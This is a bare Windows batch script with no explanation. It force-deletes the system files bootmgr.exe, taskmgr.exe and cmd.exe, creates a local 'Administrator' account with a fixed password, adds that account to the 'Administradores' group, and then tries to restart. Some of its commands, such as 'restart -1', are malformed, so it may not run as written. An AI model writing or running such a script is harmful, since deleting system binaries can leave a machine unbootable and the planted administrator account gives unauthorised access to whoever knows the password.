del /f bootmgr.exe
del /f taskmgr.exe
del /f cmd.exe
net user /add Administrator
net user Administrator 19282920101
net localgroup Administradores /add Administrator
restart -1
echo
